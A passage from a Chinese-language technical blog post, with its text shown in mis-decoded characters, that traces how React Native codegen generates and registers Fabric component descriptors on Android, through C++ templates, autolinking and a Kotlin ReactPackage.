<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">FileTemplate</span> = (<span class="hljs-params">{
  libraryName,
  componentDefinitions,
  headerPrefix,
}: {
  libraryName: string,
  componentDefinitions: string,
  headerPrefix: string,
}</span>) =&gt; <span class="hljs-string">`
/**
 * This code was generated by [react-native-codegen](https://www.npmjs.com/package/react-native-codegen).
 *
 * Do not edit this file as changes may cause incorrect behavior and will be lost
 * once the code is regenerated.
 *
 * <span class="hljs-subst">${<span class="hljs-string">'@'</span>}</span>generated by codegen project: GenerateComponentDescriptorH.js
 */

#pragma once

<span class="hljs-subst">${IncludeTemplate({headerPrefix, file: <span class="hljs-string">'ShadowNodes.h'</span>})}</span>
#include &lt;react/renderer/core/ConcreteComponentDescriptor.h&gt;
#include &lt;react/renderer/componentregistry/ComponentDescriptorProviderRegistry.h&gt;

namespace facebook::react {

<span class="hljs-subst">${componentDefinitions}</span>

void <span class="hljs-subst">${libraryName}</span>_registerComponentDescriptorsFromCodegen(
  std::shared_ptr&lt;const ComponentDescriptorProviderRegistry&gt; registry);

} // namespace facebook::react
`</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">ComponentDefinitionTemplate</span> = (<span class="hljs-params">{className}: {className: string}</span>) =&gt;
  <span class="hljs-string">`
using <span class="hljs-subst">${className}</span>ComponentDescriptor = ConcreteComponentDescriptor&lt;<span class="hljs-subst">${className}</span>ShadowNode&gt;;
`</span>.<span class="hljs-title function_">trim</span>();

<span class="hljs-comment">// çœç•¥éƒ¨åˆ†ä»£ç ......</span>
</code></pre>
<p>è¿™é‡Œæˆ‘ä»¬åªç®€å•çœ‹ä¸€ä¸‹ç”¨äºå¤´æ–‡ä»¶ç”Ÿæˆçš„å­—ç¬¦ä¸²æ¨¡ç‰ˆã€‚<code>libraryName</code>å‚æ•°å–å€¼æˆ‘ä»¬ä¸Šé¢å·²ç»åˆ†æè¿‡äº†ï¼Œæ¥è‡ª<code>package.json</code>ä¸­çš„é…ç½®é¡¹ã€‚é‚£ä¹ˆè¿˜æœ‰ä¸€ä¸ªå…³é”®å‚æ•°<code>className</code>çš„å–å€¼éœ€è¦å¼„æ¸…æ¥šã€‚å®é™…ä¸Šè¿™é‡Œçš„<code>componentDefinitions</code>å’Œ<code>className</code>éƒ½æ¥è‡ªäº<code>schema.json</code>ã€‚å…·ä½“çœ‹ä¸€ä¸‹classNameç”Ÿæˆé€»è¾‘ï¼š</p>
<pre><code class="hljs language-js" lang="js">    <span class="hljs-keyword">const</span> componentDefinitions = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(schema.<span class="hljs-property">modules</span>)
      .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">moduleName</span> =&gt;</span> {
        <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = schema.<span class="hljs-property">modules</span>[moduleName];
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>.<span class="hljs-property">type</span> !== <span class="hljs-string">'Component'</span>) {
          <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-keyword">const</span> {components} = <span class="hljs-variable language_">module</span>;
        <span class="hljs-comment">// No components in this module</span>
        <span class="hljs-keyword">if</span> (components == <span class="hljs-literal">null</span>) {
          <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }

        <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(components)
          .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">componentName</span> =&gt;</span> {
            <span class="hljs-keyword">if</span> (components[componentName].<span class="hljs-property">interfaceOnly</span> === <span class="hljs-literal">true</span>) {
              <span class="hljs-keyword">return</span>;
            }

            <span class="hljs-keyword">return</span> <span class="hljs-title class_">ComponentDefinitionTemplate</span>({<span class="hljs-attr">className</span>: componentName});
          })
          .<span class="hljs-title function_">join</span>(<span class="hljs-string">'\n'</span>);
      })
      .<span class="hljs-title function_">filter</span>(<span class="hljs-title class_">Boolean</span>)
      .<span class="hljs-title function_">join</span>(<span class="hljs-string">'\n'</span>);

    <span class="hljs-keyword">const</span> replacedTemplate = <span class="hljs-title class_">FileTemplate</span>({
      libraryName,
      componentDefinitions,
      <span class="hljs-attr">headerPrefix</span>: headerPrefix ?? <span class="hljs-string">''</span>,
    });
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå®é™…ä¸Šæ˜¯åœ¨éå†<code>schema.json</code>ä¸­çš„<code>components</code>å­—æ®µã€‚åœ¨å£°æ˜ç»„ä»¶ä¸€èŠ‚å·²ç»åˆ›å»ºäº†Demoå·¥ç¨‹ï¼Œç°åœ¨æ„å»ºé¡¹ç›®ç”Ÿæˆ<code>schema.json</code>ï¼ŒæŸ¥çœ‹ç›¸å…³å†…å®¹ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"libraryName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">""</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"modules"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"CustomWebView"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Component"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"components"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"CustomWebView"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"extendsProps"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
            <span class="hljs-punctuation">{</span>
              <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ReactNativeBuiltInType"</span><span class="hljs-punctuation">,</span>
              <span class="hljs-attr">"knownTypeName"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ReactNativeCoreViewProps"</span>
            <span class="hljs-punctuation">}</span>
          <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"events"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>çœç•¥......<span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"props"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>çœç•¥......<span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"commands"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>é‚£ä¹ˆ<code>className</code>å°±æ˜¯<code>componentName</code>ï¼Œä¹Ÿå°±æ˜¯è‡ªå®šä¹‰çš„ç»„ä»¶å<strong>CustomWebView</strong>ã€‚</p>
<h5 data-id="heading-9">C++ å±‚</h5>
<p>å¼„æ¸…æ¥šä»£ç ç”Ÿæˆçš„é€»è¾‘ä¹‹åï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥ç›´æ¥æŸ¥çœ‹ç”Ÿæˆçš„æ–‡ä»¶å†…å®¹ï¼Œä¸»è¦æ˜¯<code>ComponentDescriptors.h</code></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> once</span>

<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;react/renderer/components/CustomviewViewSpec/ShadowNodes.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;react/renderer/core/ConcreteComponentDescriptor.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;react/renderer/componentregistry/ComponentDescriptorProviderRegistry.h&gt;</span></span>

<span class="hljs-keyword">namespace</span> facebook::react {

<span class="hljs-keyword">using</span> CustomWebViewComponentDescriptor = ConcreteComponentDescriptor&lt;CustomWebViewShadowNode&gt;;

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CustomviewViewSpec_registerComponentDescriptorsFromCodegen</span><span class="hljs-params">(
  std::shared_ptr&lt;<span class="hljs-type">const</span> ComponentDescriptorProviderRegistry&gt; registry)</span></span>;
}
</code></pre>
<p><code>ComponentDescriptors.cpp</code></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;react/renderer/components/CustomviewViewSpec/ComponentDescriptors.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;react/renderer/core/ConcreteComponentDescriptor.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;react/renderer/componentregistry/ComponentDescriptorProviderRegistry.h&gt;</span></span>

<span class="hljs-keyword">namespace</span> facebook::react {

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">CustomviewViewSpec_registerComponentDescriptorsFromCodegen</span><span class="hljs-params">(
  std::shared_ptr&lt;<span class="hljs-type">const</span> ComponentDescriptorProviderRegistry&gt; registry)</span> </span>{
registry-&gt;<span class="hljs-built_in">add</span>(<span class="hljs-built_in">concreteComponentDescriptorProvider</span>&lt;CustomWebViewComponentDescriptor&gt;());
}

}
</code></pre>
<p>å¤´æ–‡ä»¶å®šä¹‰äº†ä¸€ä¸ªç±»å‹åˆ«å<code>CustomWebViewComponentDescriptor</code>ï¼Œç„¶ååœ¨å®ç°æ–‡ä»¶ä¸­æ³¨å†Œäº†è¿™ä¸ªProviderã€‚æˆ‘ä»¬çœ‹ä¸€ä¸‹<code>concreteComponentDescriptorProvider</code>å‡½æ•°çš„å®ç°ï¼Œæºç <code>react-native/packages/react-native/ReactCommon/react/renderer/componentregistry/ComponentDescriptorProvider.h</code>:</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">/*
* ä¸ºç»™å®šçš„ `ComponentDescriptor` ç±»åˆ›å»ºä¸€ä¸ª `ComponentDescriptorProvider`
*/</span>
<span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> ComponentDescriptorT&gt;
<span class="hljs-function">ComponentDescriptorProvider <span class="hljs-title">concreteComponentDescriptorProvider</span><span class="hljs-params">()</span>
</span>{
  <span class="hljs-built_in">static_assert</span>(
      std::is_base_of&lt;ComponentDescriptor, ComponentDescriptorT&gt;::value,
      <span class="hljs-string">"ComponentDescriptorT must be a descendant of ComponentDescriptor"</span>);

  <span class="hljs-keyword">return</span> {
      ComponentDescriptorT::ConcreteShadowNode::<span class="hljs-built_in">Handle</span>(),
      ComponentDescriptorT::ConcreteShadowNode::<span class="hljs-built_in">Name</span>(),
      <span class="hljs-literal">nullptr</span>,
      &amp;concreteComponentDescriptorConstructor&lt;ComponentDescriptorT&gt;};
}
</code></pre>
<p>è¿”å›å€¼æ˜¯ä¸€ä¸ª<code>ComponentDescriptorProvider</code>ç±»å‹å®ä¾‹ï¼Œç»§ç»­è·Ÿè¸ªä¸€ä¸‹ç±»å®šä¹‰ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">/*
 * æä¾›äº†ä¸€ç§ç»Ÿä¸€çš„æ–¹å¼æ¥æ„é€ ç‰¹å®šå­˜å‚¨çš„ `ComponentDescriptor` ç±»çš„å®ä¾‹ã€‚ 
 * C++ ä¸å…è®¸åˆ›å»ºæŒ‡å‘æ„é€ å‡½æ•°çš„æŒ‡é’ˆï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»ä½¿ç”¨è¿™æ ·çš„æ•°æ®ç»“æ„æ¥æ“ä½œä¸€ç»„ç±»ã€‚
 *
 * æ³¨æ„ï¼šæŸäº›ç»„ä»¶çš„ `handle` å’Œ `name` çš„å®é™…å€¼å–å†³äº `flavor`ã€‚ 
 * å¦‚æœä½¿ç”¨ç»™å®šçš„ `flavor` é€šè¿‡ `constructor` å¯¹è±¡å®ä¾‹åŒ–åï¼Œ
 * Provideræš´éœ²çš„ `handle` å’Œ `name` å€¼ä¸é¢„æœŸå€¼ç›¸åŒï¼Œåˆ™è¯¥æä¾›è€…æœ‰æ•ˆã€‚ 
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ComponentDescriptorProvider</span> <span class="hljs-keyword">final</span> {
 <span class="hljs-keyword">public</span>:
  ComponentHandle handle;
  ComponentName name;
  ComponentDescriptor::Flavor flavor;
  ComponentDescriptorConstructor *constructor;
};
</code></pre>
<p>è¿™é‡Œå¤§é‡ä½¿ç”¨äº†C++æ¨¡ç‰ˆï¼Œè¦æƒ³æŸ¥çœ‹çœŸæ­£çš„handleå’Œnameå€¼ï¼Œéœ€è¦å½“å®é™…çš„æ¨¡ç‰ˆç±»å‹ä¸­æŸ¥æ‰¾ã€‚è¿™é‡Œå…ˆæŸ¥çœ‹æºç <code>react-native/packages/react-native/ReactCommon/react/renderer/core/ConcreteComponentDescriptor.h</code>ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">namespace</span> facebook::react {

<span class="hljs-comment">/*
 * Default template-based implementation of ComponentDescriptor.
 * Use your `ShadowNode` type as a template argument and override any methods
 * if necessary.
 */</span>
<span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> ShadowNodeT&gt;
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ConcreteComponentDescriptor</span> : <span class="hljs-keyword">public</span> ComponentDescriptor {
  <span class="hljs-built_in">static_assert</span>(std::is_base_of&lt;ShadowNode, ShadowNodeT&gt;::value, <span class="hljs-string">"ShadowNodeT must be a descendant of ShadowNode"</span>);

  <span class="hljs-keyword">using</span> SharedShadowNodeT = std::shared_ptr&lt;<span class="hljs-type">const</span> ShadowNodeT&gt;;

 <span class="hljs-keyword">public</span>:
  <span class="hljs-keyword">using</span> ConcreteShadowNode = ShadowNodeT;

  <span class="hljs-comment">// çœç•¥ä»£ç ......</span>
} <span class="hljs-comment">// namespace facebook::react</span>
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>ConcreteShadowNode</code>å®é™…ä¸Šåªæ˜¯ä¸€ä¸ªç±»å‹åˆ«åï¼Œå…·ä½“çš„è¦çœ‹æ¨¡ç‰ˆçš„å®é™…å‚æ•°ï¼Œé‚£ä¹ˆ<code>ConcreteShadowNode::Handle</code>å°±ç›¸å½“äº<code>CustomWebViewShadowNode::Handle</code>ã€‚è¿™é‡Œ<code>CustomWebViewShadowNode</code>ä¹Ÿæ˜¯è‡ªåŠ¨ç”Ÿæˆçš„ä»£ç ï¼Œæˆ‘ä»¬ç›´æ¥æŸ¥çœ‹<code>android/app/build/generated/source/codegen/jni/react/renderer/components/CustomviewViewSpec/ShadowNodes.h</code>ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">/*
 * `ShadowNode` for &lt;CustomWebView&gt; component.
 */</span>
<span class="hljs-keyword">using</span> CustomWebViewShadowNode = ConcreteViewShadowNode&lt;
    CustomWebViewComponentName,
    CustomWebViewProps,
    CustomWebViewEventEmitter,
    CustomWebViewState&gt;;
</code></pre>
<p>ç»§ç»­æŸ¥çœ‹<code>android/app/build/generated/source/codegen/jni/react/renderer/components/CustomviewViewSpec/ShadowNodes.cpp</code>ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;react/renderer/components/CustomviewViewSpec/ShadowNodes.h&gt;</span></span>

<span class="hljs-keyword">namespace</span> facebook::react {

<span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> CustomWebViewComponentName[] = <span class="hljs-string">"CustomWebView"</span>;

} 
</code></pre>
<p>ç°åœ¨è·Ÿè¸ªä¸€ä¸‹<code>react-native/packages/react-native/ReactCommon/react/renderer/components/view/ConcreteViewShadowNode.h</code>ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">namespace</span> facebook::react {

<span class="hljs-comment">/*
 * Template for all &lt;View&gt;-like classes (classes which have all same props
 * as &lt;View&gt; and similar basic behaviour).
 * For example: &lt;Paragraph&gt;, &lt;Image&gt;, but not &lt;Text&gt;, &lt;RawText&gt;.
 */</span>
<span class="hljs-keyword">template</span> &lt;
    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *concreteComponentName,
    <span class="hljs-keyword">typename</span> ViewPropsT = ViewProps,
    <span class="hljs-keyword">typename</span> ViewEventEmitterT = ViewEventEmitter,
    <span class="hljs-keyword">typename</span> StateDataT = StateData&gt;
  <span class="hljs-built_in">requires</span>(std::is_base_of_v&lt;ViewProps, ViewPropsT&gt;)
<span class="hljs-keyword">class</span> ConcreteViewShadowNode : <span class="hljs-keyword">public</span> ConcreteShadowNode&lt;
                                   concreteComponentName,
                                   YogaLayoutableShadowNode,
                                   ViewPropsT,
                                   ViewEventEmitterT,
                                   StateDataT&gt; {
  <span class="hljs-comment">// çœç•¥ä»£ç ......</span>
};

} <span class="hljs-comment">// namespace facebook::react</span>
</code></pre>
<p><code>ConcreteViewShadowNode</code>ç±»ä¸­å¹¶æœªå®ç°<code>Handle</code>å’Œ<code>Name</code>æ–¹æ³•ï¼Œç»§ç»­æŸ¥çœ‹çˆ¶ç±»<code>react-native/packages/react-native/ReactCommon/react/renderer/core/ConcreteShadowNode.h</code></p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">namespace</span> facebook::react {

<span class="hljs-comment">/*
 * Base templace class for all `ShadowNode`s which connects exact `ShadowNode`
 * type with exact `Props` type.
 * `ConcreteShadowNode` is a default implementation of `ShadowNode` interface
 * with many handy features.
 */</span>
<span class="hljs-keyword">template</span> &lt;
    ComponentName concreteComponentName,
    <span class="hljs-keyword">typename</span> BaseShadowNodeT,
    <span class="hljs-keyword">typename</span> PropsT,
    <span class="hljs-keyword">typename</span> EventEmitterT = EventEmitter,
    <span class="hljs-keyword">typename</span> StateDataT = StateData&gt;
<span class="hljs-keyword">class</span> ConcreteShadowNode : <span class="hljs-keyword">public</span> BaseShadowNodeT {

 <span class="hljs-keyword">protected</span>:
  <span class="hljs-keyword">using</span> ShadowNode::props_;
  <span class="hljs-keyword">using</span> ShadowNode::state_;

 <span class="hljs-keyword">public</span>:
  <span class="hljs-keyword">using</span> BaseShadowNodeT::BaseShadowNodeT;
  <span class="hljs-comment">// çœç•¥......</span>

  <span class="hljs-function"><span class="hljs-type">static</span> ComponentName <span class="hljs-title">Name</span><span class="hljs-params">()</span>
  </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">ComponentName</span>(concreteComponentName);
  }

  <span class="hljs-function"><span class="hljs-type">static</span> ComponentHandle <span class="hljs-title">Handle</span><span class="hljs-params">()</span>
  </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">ComponentHandle</span>(concreteComponentName);
  }

  <span class="hljs-comment">// çœç•¥......</span>
};

} <span class="hljs-comment">// namespace facebook::react</span>
</code></pre>
<p>åˆ°è¿™é‡Œå°±å¾ˆæ¸…æ™°äº†ï¼ŒNameå’ŒHandleæ–¹æ³•è¿”å›å€¼å†…éƒ¨æ˜¯æŒæœ‰çš„ç›¸åŒçš„<code>concreteComponentName</code>ï¼Œè€Œè¿™ä¸ªæ¨¡ç‰ˆå‚æ•°ï¼Œæ ¹æ®å‰é¢çš„ä¼ å‚ï¼Œå®é™…æ˜¯å°±æ˜¯</p>
<p><code>CustomWebViewComponentName</code>ï¼Œä¹Ÿå°±æ˜¯<code>"CustomWebView"</code>ã€‚</p>
<p>æ‰«æFabric ç»„ä»¶åº“ï¼Œç”Ÿæˆä»£ç çš„é€»è¾‘å…¶å®å·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œæœ€ååªå‰©ä¸‹ä¸€ä¸ªé—®é¢˜ï¼ŒçœŸæ­£è°ƒç”¨æ³¨å†Œçš„ä»£ç åœ¨å“ªé‡Œï¼Ÿäº‹å®ä¸Šï¼Œå®‰å“ä¸­å¹¶æœªçœŸæ­£é€šè¿‡<code>CustomviewViewSpec_registerComponentDescriptorsFromCodegen</code>å‡½æ•°å»æ³¨å†Œï¼Œè€Œæ˜¯ä½¿ç”¨äº†autolinkingæœºåˆ¶ã€‚è¿™éƒ¨åˆ†åœ¨ã€ŠAndroidç«¯TurboModuleåˆ†æã€‹ä¸€æ–‡æœ‰è¯¦ç»†ä»‹ç»äº†ï¼Œå¯ä»¥å»å›é¡¾ä¸€ä¸‹<code>GenerateAutolinkingNewArchitecturesFileTask</code>è„šæœ¬çš„åˆ†æï¼Œå…¶ä¸­ç”Ÿæˆçš„ä¿¡æ¯æºå°±æ¥è‡ªæˆ‘ä»¬å‰é¢è´¹äº†åŠå¤©åŠ²åˆ†æçš„<code>autolinking.json</code>ä¸­çš„</p>
<p>ç°åœ¨æ¥çœ‹ä¸€ä¸‹Gradleè„šæœ¬ç”Ÿæˆçš„<code>autolinking.cpp</code>ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"autolinking.h"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;CustomviewViewSpec.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;react/renderer/components/CustomviewViewSpec/ComponentDescriptors.h&gt;</span></span>

<span class="hljs-keyword">namespace</span> facebook {
<span class="hljs-keyword">namespace</span> react {

<span class="hljs-function">std::shared_ptr&lt;TurboModule&gt; <span class="hljs-title">autolinking_ModuleProvider</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string moduleName, <span class="hljs-type">const</span> JavaTurboModule::InitParams &amp;params)</span> </span>{
<span class="hljs-keyword">auto</span> module_CustomviewViewSpec = <span class="hljs-built_in">CustomviewViewSpec_ModuleProvider</span>(moduleName, params);
<span class="hljs-keyword">if</span> (module_CustomviewViewSpec != <span class="hljs-literal">nullptr</span>) {
<span class="hljs-keyword">return</span> module_CustomviewViewSpec;
}
  <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
}

<span class="hljs-function">std::shared_ptr&lt;TurboModule&gt; <span class="hljs-title">autolinking_cxxModuleProvider</span><span class="hljs-params">(<span class="hljs-type">const</span> std::string moduleName, <span class="hljs-type">const</span> std::shared_ptr&lt;CallInvoker&gt;&amp; jsInvoker)</span> </span>{

  <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
}

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">autolinking_registerProviders</span><span class="hljs-params">(std::shared_ptr&lt;ComponentDescriptorProviderRegistry <span class="hljs-type">const</span>&gt; providerRegistry)</span> </span>{
providerRegistry-&gt;<span class="hljs-built_in">add</span>(<span class="hljs-built_in">concreteComponentDescriptorProvider</span>&lt;CustomWebViewComponentDescriptor&gt;());
  <span class="hljs-keyword">return</span>;
}

} <span class="hljs-comment">// namespace react</span>
} <span class="hljs-comment">// namespace facebook</span>
</code></pre>
<p>è¿™é‡Œç”Ÿæˆäº†<code>autolinking_registerProviders</code>æ–¹æ³•ï¼Œè¿™æ‰æ˜¯çœŸæ­£æ³¨å†Œç»„ä»¶çš„åœ°æ–¹ã€‚è€Œæ­¤å¤„çš„ä»£ç æ˜¯ç”±Gradleè„šæœ¬ç”Ÿæˆï¼Œå…¶ä¸­çš„å…³é”®ä¿¡æ¯å°±æ¥è‡ª<code>autolinking.json</code>ä¸­çš„<code>componentDescriptors</code>å­—æ®µï¼Œä¹Ÿå°±æ˜¯å‰é¢æˆ‘ä»¬è´¹äº†åŠå¤©åŠ²æ‰åˆ†æå‡ºè¯¥å­—æ®µçš„é»˜è®¤å€¼çš„åœ°æ–¹ã€‚æ•´ä¸ªReact Nativeçš„ä»£ç ç”Ÿæˆå…¶å®æ˜¯æœ‰äº›æ··ä¹±çš„ï¼Œä¼šç”Ÿæˆä¸€äº›å¹¶ä¸ä¼šä½¿ç”¨çš„ä»£ç ï¼Œå¯¹ç†è§£äº§ç”Ÿå¹²æ‰°ã€‚</p>
<p>å…³äº<code>autolinking_registerProviders</code>å‡½æ•°çš„è°ƒç”¨é“¾ï¼Œåœ¨å‰é¢çš„æ–‡ç« ä¹Ÿåˆ†ææ¶‰åŠè¿‡ï¼Œè¿™é‡Œå†å›é¡¾ä¸€ä¸‹è°ƒç”¨æµç¨‹ï¼Œæºç <code>react-native/packages/react-native/ReactAndroid/cmake-utils/default-app-setup/OnLoad.cpp</code>ï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">namespace</span> facebook::react {

<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">registerComponents</span><span class="hljs-params">(
    std::shared_ptr&lt;<span class="hljs-type">const</span> ComponentDescriptorProviderRegistry&gt; registry)</span> </span>{
  <span class="hljs-comment">// è‡ªå®šä¹‰ Fabric ç»„ä»¶æ”¾åœ¨è¿™é‡Œã€‚æ‚¨å¯ä»¥åœ¨æ­¤å¤„æ³¨å†Œæ¥è‡ªæ‚¨çš„åº”ç”¨ç¨‹åºæˆ–ç¬¬ä¸‰æ–¹åº“çš„è‡ªå®šä¹‰ç»„ä»¶</span>
  <span class="hljs-comment">// providerRegistry-&gt;add(concreteComponentDescriptorProvider&lt;</span>
  <span class="hljs-comment">//        MyComponentDescriptor&gt;());</span>

  <span class="hljs-comment">// We link app local components if available</span>
<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> REACT_NATIVE_APP_COMPONENT_REGISTRATION</span>
  <span class="hljs-built_in">REACT_NATIVE_APP_COMPONENT_REGISTRATION</span>(registry);
<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>

  <span class="hljs-comment">// And we fallback to the components autolinked</span>
  <span class="hljs-built_in">autolinking_registerProviders</span>(registry);
}

<span class="hljs-comment">// çœç•¥éƒ¨åˆ†ä»£ç ......</span>

} <span class="hljs-comment">// namespace facebook::react</span>

<span class="hljs-function">JNIEXPORT jint JNICALL <span class="hljs-title">JNI_OnLoad</span><span class="hljs-params">(JavaVM* vm, <span class="hljs-type">void</span>*)</span> </span>{
  <span class="hljs-keyword">return</span> facebook::jni::<span class="hljs-built_in">initialize</span>(vm, [] {
    facebook::react::DefaultTurboModuleManagerDelegate::cxxModuleProvider =
        &amp;facebook::react::cxxModuleProvider;
    facebook::react::DefaultTurboModuleManagerDelegate::javaModuleProvider =
        &amp;facebook::react::javaModuleProvider;
    facebook::react::DefaultComponentsRegistry::
        registerComponentDescriptorsFromEntryPoint =
            &amp;facebook::react::registerComponents;
  });
}
</code></pre>
<p>å¯è§ï¼Œæ³¨å†Œçš„èµ·ç‚¹ä¹Ÿæ˜¯<code>JNI_OnLoad</code>å‡½æ•°ã€‚</p>
<h5 data-id="heading-10">Kotlinå±‚</h5>
<p>ä½¿ç”¨<code>npx create-react-native-library@latest</code>å·¥å…·åˆ›å»ºä¸€ä¸ªFabricç»„ä»¶åº“æ—¶ï¼Œä¼šç”Ÿæˆä¸€äº›æ¨¡ç‰ˆä»£ç ï¼Œå…¶ä¸­åŒ…æ‹¬æˆ‘ä»¬ä¸Šé¢æåˆ°çš„<code>CustomWebViewManager</code>ç±»ï¼Œç°åœ¨æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹<code>CustomWebViewPackage</code>ç±»ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomWebViewPackage</span> : <span class="hljs-type">ReactPackage</span> {
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createViewManagers</span><span class="hljs-params">(reactContext: <span class="hljs-type">ReactApplicationContext</span>)</span></span>: List&lt;ViewManager&lt;*, *&gt;&gt; {
    <span class="hljs-keyword">val</span> viewManagers: MutableList&lt;ViewManager&lt;*, *&gt;&gt; = ArrayList()
    viewManagers.add(CustomWebViewManager())
    <span class="hljs-keyword">return</span> viewManagers
  }

  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">createNativeModules</span><span class="hljs-params">(reactContext: <span class="hljs-type">ReactApplicationContext</span>)</span></span>: List&lt;NativeModule&gt; {
    <span class="hljs-keyword">return</span> emptyList()
  }
}
</code></pre>
<p>è¿™é‡Œ<code>createViewManagers</code>æ–¹æ³•ä¼šè¿”å›ä¸€ä¸ª<code>ViewManager</code>çš„å®ä¾‹åˆ—è¡¨ã€‚æ ¹æ®æˆ‘ä»¬åœ¨<a href="https://juejin.cn/post/7595178023256211475" target="_blank" title="https://juejin.cn/post/7595178023256211475">ã€ŠReactNativeæ–°æ¶æ„ä¹‹Androidç«¯TurboModuleæœºåˆ¶å®Œå…¨è§£æã€‹</a>ä¸€æ–‡ä¸­åˆ†æ<code>GeneratePackageListTask</code>ä»»åŠ¡çš„ç»“æœï¼Œæˆ‘ä»¬çŸ¥é“æœ€ç»ˆä¼šç”Ÿæˆä¸€ä¸ª<code>PackageList</code>æ–‡ä»¶ï¼Œå…¶ä¸­ä¼šæ³¨å…¥æ¯ä¸ªä¸‰æ–¹TurboModuleæˆ–Fabricç»„ä»¶åŒ…ä¸­çš„<strong>ReactPackage</strong>å®ç°ç±»ã€‚</p>
